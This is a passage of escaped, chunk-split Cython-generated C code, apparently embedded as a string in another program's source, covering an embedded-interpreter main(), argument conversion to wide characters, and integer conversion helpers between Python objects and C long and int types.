<floatingpoint.h>\\\\n#endif\\\\n#if PY_MAJOR_VERSION < 3\\\\nint main(int argc, char** argv) {\\\\n#elif defined(WIN32) || defined(MS_WINDOWS)\\\\nint wmain(int argc, wchar_t **argv) {\\\\n#else\\\\nstatic int __Pyx_main(int argc, wchar_t **argv) {\\\\n#endif\\\\n    /* 754 requires that FP exceptions run in \\\\\\\"no stop\\\\\\\" mode by default,\\\\n     * and until C vendors implement C99's ways to control F""P exceptions,\\\\n     * Python requires non-stop mode.  Alas\"\", some platforms enable FP\\\\n     * exceptions by default.  Here we disable them.\\\\n     */\\\\n#ifdef __FreeBSD__\\\\n    fp_except_t m;\\\\n    m = fpgetmask();\\\\n    fpsetmask(m & ~FP_X_OFL);\\\\n#endif\\\\n    if (argc && argv)\\\\n        Py_SetProgramName(argv[0]);\\\\n    Py_Initialize();\\\\n    if (argc && argv)\\\\n        PySys_SetArgv(argc, argv);\\\\n    {\\\\n      PyObject* m = NULL;\\\\n      __pyx_module_is_main_source = 1;\\\\n      #if PY_MAJOR_VERSION < 3\\\\n          initsource();\\\\n      #elif CYTHON_PEP489_MULTI_PHASE_INIT\\\\n          m = PyInit_source();\\\\n          if (!PyModule_Check(m)) {\\\\n              PyModuleDef *mdef = (PyModuleDef *) m;\\\\n              PyObject *modname = PyUnicode_FromString(\\\\\\\"__main__\\\\\\\");\\\\n              m = NULL;\\\\n              if (modname) {\\\\n                  m = PyModule_NewObject(modname);\\\\n                  Py_DECREF(modname);\\\\n                  if (m) PyModule_ExecDef(m, mdef);\\\\n              }\\\\n          }\\\\n      #else\\\\n          m = PyI\\\"\\\"nit_source();\\\\n      #endif\\\\n      if (PyErr_Occurred()) {\\\\n          PyErr_Print();\\\\n          #if PY_MAJOR_VERSION < 3\\\\n          if (Py_FlushLine()) PyErr_Clear();\\\\n          #endif\\\\n          return 1;\\\\n      }\\\\n      Py_XDECREF(m);\\\\n    }\\\\n#if PY_VERSION_HEX < 0x03060000\\\\n    Py_Finalize();\\\\n#else\\\\n    if (Py_FinalizeEx() < 0)\\\\n        return 2;\\\\n#endif\\\\n    return 0;\\\\n}\\\\n#if PY_MAJOR_VERSION >= 3 && !defined(WIN32) && !defined(MS_WINDOWS)\\\\n#include <locale.h>\\\\nstatic wchar_t*\\\\n__Pyx_char2wchar(char* arg)\\\\n{\\\\n    wchar_t *res;\\\\n#ifdef HAVE_BROKEN_MBSTOWCS\\\\n    /* Some platforms have a broken implementation of\\\\n     * mbstowcs which does not count the characters that\\\\n     * would result from conversion.  Use an upper bound.\\\\n     */\\\\n    size_t argsize = s""trlen(arg);\\\\n#else\\\\n    size_t argsize = mbstowcs(NULL, arg, 0);\\\\n#endif\\\\n    size_t count;\\\\n    unsigned char *in;\\\\n    wchar_t *out;\\\\n#ifdef HAVE_MBRTOWC\\\\n    mbstate_t mbs;\\\\n#endif\\\\n    \"\"if (argsize != (size_t)-1) {\\\\n        res = (wchar_t *)malloc((argsize+1)*sizeof(wchar_t));\\\\n        if (!res)\\\\n            goto oom;\\\\n        count = mbstowcs(res, arg, argsize+1);\\\\n        if (count != (size_t)-1) {\\\\n            wchar_t *tmp;\\\\n            /* Only use the result if it contains no\\\\n               surrogate characters. */\\\\n            for (tmp = res; *tmp != 0 &&\\\\n                     (*tmp < 0xd800 || *tmp > 0xdfff); tmp++)\\\\n                ;\\\\n            if (*tmp == 0)\\\\n                return res;\\\\n        }\\\\n        free(res);\\\\n    }\\\\n#ifdef HAVE_MBRTOWC\\\\n    /* Overallocate; as multi-byte characters are in the argument, the\\\\n       actual output could use less memory. */\\\\n    argsize = strlen(arg) + 1;\\\\n    res = (wchar_t *)malloc(argsize*sizeof(wchar_t));\\\\n    if (!res) goto oom;\\\\n    in = (unsigned char*)arg;\\\\n    out = res;\\\\n    memset(&mbs, 0, sizeof mbs);\\\\n    while (argsize) {\\\\n        size_t converted = mbrtowc(out, (char*)in, argsize, &mbs);\\\\n        if (converted == 0)\\\\n            break;\\\\n      \\\"\\\"  if (converted == (size_t)-2) {\\\\n            /* Incomplete character. This should never happen,\\\\n               since we provide everything that we have -\\\\n               unless there is a bug in the C library, or I\\\\n               misunderstood how mbrtowc works. */\\\\n            fprintf(stderr, \\\\\\\"unexpected mbrtowc result -2\\\\\\\\\\\\\\\\n\\\\\\\");\\\\n            free(res);\\\\n            return NULL;\\\\n        }\\\\n        if (converted == (size_t)-1) {\\\\n            /* Conversion error. Escape as UTF-8b, and start over\\\\n               in the initial shift state. */\\\\n            *out++ = 0xdc""00 + *in++;\\\\n            argsize--;\\\\n            memset(&mbs, 0, sizeof mbs);\\\\n            continue;\\\\n        }\\\\n        if (*out >= 0xd800 && *out <= 0xdfff) {\\\\n            /* Surrogate character.  Escape the original\\\\n               byte sequence with surrogateescape. */\\\\n            argsize -= converted;\\\\n        \"\"    while (converted--)\\\\n                *out++ = 0xdc00 + *in++;\\\\n            continue;\\\\n        }\\\\n        in += converted;\\\\n        argsize -= converted;\\\\n        out++;\\\\n    }\\\\n#else\\\\n    /* Cannot use C locale for escaping; manually escape as if charset\\\\n       is ASCII (i.e. escape all bytes > 128. This will still roundtrip\\\\n       correctly in the locale's charset, which must be an ASCII superset. */\\\\n    res = (wchar_t *)malloc((strlen(arg)+1)*sizeof(wchar_t));\\\\n    if (!res) goto oom;\\\\n    in = (unsigned char*)arg;\\\\n    out = res;\\\\n    while(*in)\\\\n        if(*in < 128)\\\\n            *out++ = *in++;\\\\n        else\\\\n            *out++ = 0xdc00 + *in++;\\\\n    *out = 0;\\\\n#endif\\\\n    return res;\\\\noom:\\\\n    fprintf(stderr, \\\\\\\"out of memory\\\\\\\\\\\\\\\\n\\\\\\\");\\\\n    return NULL;\\\\n}\\\\nint\\\\nmain(int argc, char **argv)\\\\n{\\\\n    if (!argc) {\\\\n        return __Pyx_main(0, NULL);\\\\n    }\\\\n    else {\\\\n        int i, res;\\\\n        wchar_t **argv_copy = (wchar_t **)malloc(sizeof(wchar_t*)*argc);\\\\n        wchar_t **argv_copy2 = (wchar_t **)malloc(sizeof(wchar_t*)*argc);\\\\n        char *oldloc = strdup(setlocale(LC\\\"\\\"_ALL, NULL));\\\\n        if (!argv_copy || !argv_copy2 || !oldloc) {\\\\n            fprintf(stderr, \\\\\\\"out of memory\\\\\\\\\\\\\\\\n\\\\\\\");\\\\n            free(argv_copy);\\\\n            free(argv_copy2);\\\\n            free(oldloc);\\\\n            return 1;\\\\n        }\\\\n        res = 0;\\\\n        setlocale(LC_ALL, \\\\\\\"\\\\\\\");\\\\n        for (i = 0; i < argc; i++) {""\\\\n            argv_copy2[i] = argv_copy[i] = __Pyx_char2wchar(argv[i]);\\\\n            if (!argv_copy[i]) res = 1;\\\\n        }\\\\n        setlocale(LC_ALL, oldloc);\\\\n        free(oldloc);\\\\n        if (res == 0)\\\\n            res = __Pyx_main(argc, argv_copy);\\\\n        for (i = 0; i < argc; i++) {\\\\n#if PY_VERSION_HEX < 0x03050000\\\\n            free(argv_copy2[i]);\\\\n#else\\\\n            PyMem_RawFree(argv_copy2[i]);\\\\n#endif\\\\n        }\\\\n        free(argv_copy);\\\\n        free(argv_copy\"\"2);\\\\n        return res;\\\\n    }\\\\n}\\\\n#endif\\\\n\\\\n/* CIntToPy */\\\\n    static CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value) {\\\\n#ifdef __Pyx_HAS_GCC_DIAGNOSTIC\\\\n#pragma GCC diagnostic push\\\\n#pragma GCC diagnostic ignored \\\\\\\"-Wconversion\\\\\\\"\\\\n#endif\\\\n    const long neg_one = (long) -1, const_zero = (long) 0;\\\\n#ifdef __Pyx_HAS_GCC_DIAGNOSTIC\\\\n#pragma GCC diagnostic pop\\\\n#endif\\\\n    const int is_unsigned = neg_one > const_zero;\\\\n    if (is_unsigned) {\\\\n        if (sizeof(long) < sizeof(long)) {\\\\n            return PyInt_FromLong((long) value);\\\\n        } else if (sizeof(long) <= sizeof(unsigned long)) {\\\\n            return PyLong_FromUnsignedLong((unsigned long) value);\\\\n#ifdef HAVE_LONG_LONG\\\\n        } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {\\\\n            return PyLong_FromUnsignedLongLong((unsigned PY_LONG_LONG) value);\\\\n#endif\\\\n        }\\\\n    } else {\\\\n        if (sizeof(long) <= sizeof(long)) {\\\\n            return PyInt_FromLong((long) value);\\\\n#ifdef HAVE_LONG_LONG\\\\n        } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {\\\\n            return PyLong_FromLongLong((PY_LONG_LONG) value);\\\\n#endif\\\\n        }\\\\n    }\\\\n    {\\\\n        int one = 1; int little \\\"\\\"= (int)*(unsigned char *)&one;\\\\n        unsigned char *bytes = (unsigned char *)&value;\\\\n        return _PyLong_FromByteArray(bytes, sizeof(lon""g),\\\\n                                     little, !is_unsigned);\\\\n    }\\\\n}\\\\n\\\\n/* CIntFromPyVerify */\\\\n    #define __PYX_VERIFY_RETURN_INT(target_type, func_type, func_value)\\\\\\\\\\\\n    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 0)\\\\n#define __PYX_VERIFY_RETURN_INT_EXC(target_type, func_type, func_value)\\\\\\\\\\\\n    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 1)\\\\n#define __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, exc)\\\\\\\\\\\\n    {\\\\\\\\\\\\n        func_type value = func_value;\\\\\\\\\\\\n        if (sizeof(target_type) < sizeof(func_type)) {\\\\\\\\\\\\n            if (un\"\"likely(value != (func_type) (target_type) value)) {\\\\\\\\\\\\n                func_type zero = 0;\\\\\\\\\\\\n                if (exc && unlikely(value == (func_type)-1 && PyErr_Occurred()))\\\\\\\\\\\\n                    return (target_type) -1;\\\\\\\\\\\\n                if (is_unsigned && unlikely(value < zero))\\\\\\\\\\\\n                    goto raise_neg_overflow;\\\\\\\\\\\\n                else\\\\\\\\\\\\n                    goto raise_overflow;\\\\\\\\\\\\n            }\\\\\\\\\\\\n        }\\\\\\\\\\\\n        return (target_type) value;\\\\\\\\\\\\n    }\\\\n\\\\n/* CIntFromPy */\\\\n    static CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *x) {\\\\n#ifdef __Pyx_HAS_GCC_DIAGNOSTIC\\\\n#pragma GCC diagnostic push\\\\n#pragma GCC diagnostic ignored \\\\\\\"-Wconversion\\\\\\\"\\\\n#endif\\\\n    const long neg_one = (long) -1, const_zero = (long) 0;\\\\n#ifdef __Pyx_HAS_GCC_DIAGNOSTIC\\\\n#pragma GCC diagnostic pop\\\\n#endif\\\\n    const int is_unsigned = neg_one > const_zero;\\\\n#if PY_MAJOR_VERSION < 3\\\\n    if (likely(PyInt_Check(x))) {\\\\n        if (sizeof(long) < sizeof(long)) {\\\\n            __PYX_VERIFY_RETURN_INT(long, long, PyInt_AS_LONG(x))\\\\n        } else {\\\\n            long val = PyInt_AS_LONG(x);\\\\n            if (is_unsigned && unlikely(val < 0)) {\\\\n    ""            goto raise_neg_overflow;\\\\n            }\\\\n            return (long) val;\\\\n        }\\\\n    } else\\\"\\\"\\\\n#endif\\\\n    if (likely(PyLong_Check(x))) {\\\\n        if (is_unsigned) {\\\\n#if CYTHON_USE_PYLONG_INTERNALS\\\\n            const digit* digits = ((PyLongObject*)x)->ob_digit;\\\\n            switch (Py_SIZE(x)) {\\\\n                case  0: return (long) 0;\\\\n                case  1: __PYX_VERIFY_RETURN_INT(long, digit, digits[0])\\\\n                case 2:\\\\n                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {\\\\n                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {\\\\n                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\\\\n                     \"\"   } else if (8 * sizeof(long) >= 2 * PyLong_SHIFT) {\\\\n                            return (long) (((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));\\\\n                        }\\\\n                    }\\\\n                    break;\\\\n                case 3:\\\\n                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {\\\\n                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {\\\\n                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\\\\n                        } else if (8 * sizeof(long) >= 3 * PyLong_SHIFT) {\\\\n                            return (long) (((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));\\\\n                        }\\\\n                    }\\\\n                    break;\\\\n                case 4:\\\\n                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {\\\\n                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {\\\\n                            __PYX_VERIFY_RETURN_INT(long, u""nsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\\\\n                        } else if \\\"\\\"(8 * sizeof(long) >= 4 * PyLong_SHIFT) {\\\\n                            return (long) (((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));\\\\n                        }\\\\n                    }\\\\n                    break;\\\\n            }\\\\n#endif\\\\n#if CYTHON_COMPILING_IN_CPYTHON\\\\n            if (unlikely(Py_SIZE(x) < 0)) {\\\\n                goto raise_neg_overflow;\\\\n            }\\\\n#else\\\\n            {\\\\n                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);\\\\n                if (unlikely(result < 0))\\\\n                    return (\"\"long) -1;\\\\n                if (unlikely(result == 1))\\\\n                    goto raise_neg_overflow;\\\\n            }\\\\n#endif\\\\n            if (sizeof(long) <= sizeof(unsigned long)) {\\\\n                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned long, PyLong_AsUnsignedLong(x))\\\\n#ifdef HAVE_LONG_LONG\\\\n            } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {\\\\n                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))\\\\n#endif\\\\n            }\\\\n        } else {\\\\n#if CYTHON_USE_PYLONG_INTERNALS\\\\n            const digit* digits = ((PyLongObject*)x)->ob_digit;\\\\n            switch (Py_SIZE(x)) {\\\\n                case  0: return (long) 0;\\\\n                case -1: __PYX_VERIFY_RETURN_INT(long, sdigit, (sdigit) (-(sdigit)digits[0]))\\\\n                case  1: __PYX_VERIFY_RETURN_INT(long,  digit, +digits[0])\\\\n                case -2:\\\\n                    if (8 * sizeof(long) - 1 > 1 * PyLong_SHIFT) {\\\\n                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {""\\\\n                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\\\\n                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {\\\\n                            return (long) (((long)-1)*(((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));\\\"\\\"\\\\n                        }\\\\n                    }\\\\n                    break;\\\\n                case 2:\\\\n                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {\\\\n                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {\\\\n                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\\\\n                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {\\\\n                            return (long) ((((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));\\\\n       \"\"                 }\\\\n                    }\\\\n                    break;\\\\n                case -3:\\\\n                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {\\\\n                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {\\\\n                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\\\\n                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {\\\\n                            return (long) (((long)-1)*(((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));\\\\n                        }\\\\n                    }\\\\n                    break;\\\\n                case 3:\\\\n                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {\\\\n                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {\\\\n                            __PYX_VERIFY_RETURN_INT(long, ""unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\\\\n                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {\\\\n                            return (long) ((((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));\\\\n                        }\\\\n                    }\\\\n                    break;\\\"\\\"\\\\n                case -4:\\\\n                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {\\\\n                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {\\\\n                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\\\\n                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {\\\\n                            return (long) (((long)-1)*(((((((((l\"\"ong)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));\\\\n                        }\\\\n                    }\\\\n                    break;\\\\n                case 4:\\\\n                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {\\\\n                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {\\\\n                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\\\\n                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {\\\\n                            return (long) ((((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));\\\\n                        }\\\\n                    }""\\\\n                    break;\\\\n            }\\\\n#endif\\\\n            if (sizeof(long) <= sizeof(long)) {\\\\n                __PYX_VERIFY_RETURN_INT_EXC(long, long, PyLong_AsLong(x))\\\\n#ifdef HAVE_LONG_LONG\\\\n            } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {\\\\n                __PYX_VERIFY_RETURN_INT_EXC(long, PY_LONG_LONG, PyLong_AsLongLong(x))\\\\n#endif\\\\n            }\\\\n        }\\\\n        {\\\\n#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)\\\\n            PyErr_SetString(PyExc_RuntimeError,\\\\n         \\\"\\\"                   \\\\\\\"_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers\\\\\\\");\\\\n#else\\\\n            long val;\\\\n            PyObject *v = __Pyx_PyNumber_IntOrLong(x);\\\\n #if PY_MAJOR_VERSION < 3\\\\n            if (likely(v) && !PyLong_Check(v)) {\\\\n                PyObject *tmp = v;\\\\n                v = PyNumber_Long(tmp);\\\\n                Py_DECREF(tmp);\\\\n            }\\\\n #endif\\\\n            if (likely(v)) {\\\\n                int one = 1; int is_little = (int)*(unsigned char *)&one;\\\\n           \"\"     unsigned char *bytes = (unsigned char *)&val;\\\\n                int ret = _PyLong_AsByteArray((PyLongObject *)v,\\\\n                                              bytes, sizeof(val),\\\\n                                              is_little, !is_unsigned);\\\\n                Py_DECREF(v);\\\\n                if (likely(!ret))\\\\n                    return val;\\\\n            }\\\\n#endif\\\\n            return (long) -1;\\\\n        }\\\\n    } else {\\\\n        long val;\\\\n        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);\\\\n        if (!tmp) return (long) -1;\\\\n        val = __Pyx_PyInt_As_long(tmp);\\\\n        Py_DECREF(tmp);\\\\n        return val;\\\\n    }\\\\nraise_overflow:\\\\n    PyErr_SetString(PyExc_OverflowError,\\\\n        \\\\\\\"value too large to convert to long\\\\\\\");\\\\n    return (long) -1;\\\\nraise_neg""_overflow:\\\\n    PyErr_SetString(PyExc_OverflowError,\\\\n        \\\\\\\"can't convert negative value to long\\\\\\\");\\\\n    return (long) -1;\\\\n}\\\\n\\\\n/* CIntFromPy */\\\\n    static CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *x) {\\\\n#ifdef __Pyx_HAS_GCC_DIAGNOSTIC\\\\n#pragma GCC diagnostic push\\\\n#pragma GCC diagnostic ignored \\\\\\\"-Wconversion\\\\\\\"\\\\n#endif\\\\n    const int neg_one = (int) -1, const_zero = (int) 0;\\\\n#ifdef __Pyx_HAS_GCC_DIAGNOSTIC\\\\n#pragma GCC diagnostic pop\\\\n#endif\\\\n    const int is_unsigned = neg_one > const_zero;\\\\n#if PY_MAJOR_VERSION < 3\\\\n    if (likely(PyInt_Check(x))) {\\\\n        if (sizeof(int) < sizeof(long)) {\\\\n            __PYX_VERIFY_RETURN_INT(int, long, PyInt_AS_LONG(x))\\\\n        } else {\\\\n      \\\"\\\"      long val = PyInt_AS_LONG(x);\\\\n            if (is_unsigned && unlikely(val < 0)) {\\\\n                goto raise_neg_overflow;\\\\n            }\\\\n            return (int) val;\\\\n        }\\\\n    } else\\\\n#endif\\\\n    if (likely(PyLong_Check(x))) {\\\\n        if (is_unsigned) {\\\\n#if CYTHON_USE_PYLONG_INTERNALS\\\\n            const digit* digits = ((PyLongObject*)x)->ob_digit;\\\\n            switch (Py_SIZE(x)) {\\\\n                case  0: return (i\"\"nt) 0;\\\\n                case  1: __PYX_VERIFY_RETURN_INT(int, digit, digits[0])\\\\n                case 2:\\\\n                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {\\\\n                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {\\\\n                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\\\\n                        } else if (8 * sizeof(int) >= 2 * PyLong_SHIFT) {\\\\n                            return (int) (((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));\\\\n                        }\\\\n                    }\\\\n                    break;\\\\n                case 3:\\\\n     ""               if (8 * sizeof(int) > 2 * PyLong_SHIFT) {\\\\n                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {\\\\n                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\\\\n                        } else if (8 * sizeof(int) >= 3 * PyLong_SHIFT) {\\\\n                            return (int) (((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));\\\\n                        }\\\\n                    }\\\\n                    break;\\\\n                case 4:\\\\n                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {\\\\n                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {\\\\n                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)di\\\"\\\"gits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\\\\n                        } else if (8 * sizeof(int) >= 4 * PyLong_SHIFT) {\\\\n                            return (int) (((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));\\\\n              \"\"          }\\\\n                    }\\\\n                    break;\\\\n            }\\\\n#endif\\\\n#if CYTHON_COMPILING_IN_CPYTHON\\\\n            if (unlikely(Py_SIZE(x) < 0)) {\\\\n                goto raise_neg_overflow;\\\\n            }\\\\n#else\\\\n            {\\\\n                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);\\\\n                if (unlikely(result < 0))\\\\n                    return (int) -1;\\\\n                if (unlikely(result == 1))\\\\n                    goto raise_neg_overflow;\\\\n            }\\\\n#endif\\\\n            if (sizeof(int) <= sizeof(unsigned long)) {\\\\n                __PYX_VERI""FY_RETURN_INT_EXC(int, unsigned long, PyLong_AsUnsignedLong(x))\\\\n#ifdef HAVE_LONG_LONG\\\\n            } else if (sizeof(int) <= sizeof(unsigned PY_LONG_LONG)) {\\\\n                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))\\\\n#endif\\\\n            }\\\\n        } else {\\\\n#if CYTHON_USE_PYLONG_INTERNALS\\\\n            const digit* digits = ((PyLongObject*)x)->ob_digit;\\\\n            switch (Py_SIZE(x)) {\\\\n                case  0: return (int) 0;\\\\n                case -1: __PYX_VERIFY_RETURN_INT(int, sdigit, (sdigit) (-(sdigit)digits[0]))\\\\n                case  1: __PYX_VERIFY_RETURN_INT(int,  digit, +digits[0])\\\\n                case -2:\\\\n                    if (8 * sizeof(int) - 1 > 1 * PyLong_SHIFT) {\\\\n                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {\\\\n                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\\\\n                        } e\\\"\\\"lse if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {\\\\n                            return (int) (((int)-1)*(((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));\\\\n                        }\\\\n                    }\\\\n                    break;\\\\n                case 2:\\\\n                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {\\\\n                        if (8 * si\"\"zeof(unsigned long) > 2 * PyLong_SHIFT) {\\\\n                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\\\\n                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {\\\\n                            return (int) ((((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));\\\\n                        }\\\\n                    }\\\\n                    break;\\\\n                case -3:\\\\n                    if (8 * sizeof(int) - 1 > 2 * PyLong_SHI""FT) {\\\\n                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {\\\\n                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\\\\n                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {\\\\n                            return (int) (((int)-1)*(((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));\\\\n                        }\\\\n                    }\\\\n                    break;\\\\n                case 3:\\\\n                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {\\\\n                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {\\\\n                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\\\\n                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {\\\\n                            return (int) ((((((((int)digits[2]) << PyLong_SHIF\\\"\\\"T) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));\\\\n                        }\\\\n                    }\\\\n                    break;\\\\n                case -4:\\\\n                    if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {\\\\n                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {\\\\n                      \"\"      __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\\\\n                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {\\\\n                            return (int) (((int)-1)*(((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));\\\\n   ""                     }\\\\n                    }\\\\n                    break;\\\\n                case 4:\\\\n                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {\\\\n                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {\\\\n                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\\\\n                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {\\\\n                            return (int) ((((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));\\\\n                        }\\\\n                    }\\\\n                    break;\\\\n            }\\\\n#endif\\\\n            if (sizeof(int) <= sizeof(long)) {\\\\n                __PYX_VERIFY_RETURN_INT_EXC(int, long, PyLong_AsLong(x))\\\\n#ifdef HAVE_LONG_LONG\\\\n            } else if (sizeof(int) <= sizeof(PY_LONG_LONG)) {\\\\n                